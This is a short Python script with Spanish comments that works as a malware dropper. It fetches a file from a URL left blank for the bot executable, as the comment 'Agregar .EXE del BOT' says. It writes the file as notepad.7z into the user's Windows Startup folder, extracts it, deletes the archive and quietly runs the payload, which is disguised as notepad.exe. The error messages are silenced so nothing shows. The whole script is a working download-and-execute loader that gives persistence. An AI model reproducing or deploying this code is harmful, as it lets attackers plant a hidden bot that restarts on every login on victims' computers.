import os
import requests
import subprocess
import py7zr
from time import sleep

def download_and_extract():
    try:
        usuario = os.getlogin()

        start_up_path = f"C:\\Users\\{usuario}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\notepad.7z"

        url = " " #Agregar .EXE del BOT

        response = requests.get(url, stream=True)

        if response.status_code == 200:
            with open(start_up_path, "wb") as file:
                for chunk in response.iter_content(chunk_size=8192):
                    file.write(chunk)
            #print("Archivo descargado exitosamente.")

            temp_dir = f"C:\\Users\\{usuario}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            try:
                with py7zr.SevenZipFile(start_up_path, mode='r') as z:
                    z.extractall(path=temp_dir)
                #print("Archivo descomprimido exitosamente.")
            except Exception as e:
                #print(f"Error al descomprimir el archivo .7z: {e}")
                return
        else:
            #print(f"Error al descargar el archivo. Código de estado: {response.status_code}")
            return

        sleep(2)

        exe_path = f"C:\\Users\\{usuario}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\notepad.exe"  # Modificar según el nombre del .exe

        if os.path.exists(exe_path):
            #print("Ejecutando el archivo .exe...")
            os.remove(start_up_path)
            subprocess.run([exe_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            #print("No se encontró el archivo .exe después de la descompresión.")
            pass
    
    except Exception as e:
        #print(f"Ocurrió un error: {e}")
        pass


